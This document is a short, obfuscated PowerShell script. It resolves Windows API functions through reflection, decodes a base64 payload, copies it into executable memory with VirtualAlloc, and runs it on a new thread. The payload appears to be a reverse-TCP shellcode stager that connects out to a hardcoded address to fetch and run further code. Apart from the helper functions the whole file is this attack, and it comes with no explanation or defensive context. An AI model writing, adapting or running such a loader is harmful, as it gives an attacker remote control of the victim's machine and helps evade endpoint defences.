function pI {
	Param ($u4, $jkC)		
	$huweT = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $huweT.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($huweT.GetMethod('GetModuleHandle')).Invoke($null, @($u4)))), $jkC))
}

function yUP {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $mt1,
		[Parameter(Position = 1)] [Type] $d5Vd = [Void]
	)
	
	$sSr = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$sSr.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $mt1).SetImplementationFlags('Runtime, Managed')
	$sSr.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $d5Vd, $mt1).SetImplementationFlags('Runtime, Managed')
	
	return $sSr.CreateType()
}

[Byte[]]$zLA = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAB5swKhl4UFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$j9bG = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((pI kernel32.dll VirtualAlloc), (yUP @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $zLA.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($zLA, 0, $j9bG, $zLA.length)

$p0Ydo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((pI kernel32.dll CreateThread), (yUP @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$j9bG,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((pI kernel32.dll WaitForSingleObject), (yUP @([IntPtr], [Int32]))).Invoke($p0Ydo,0xffffffff) | Out-Null
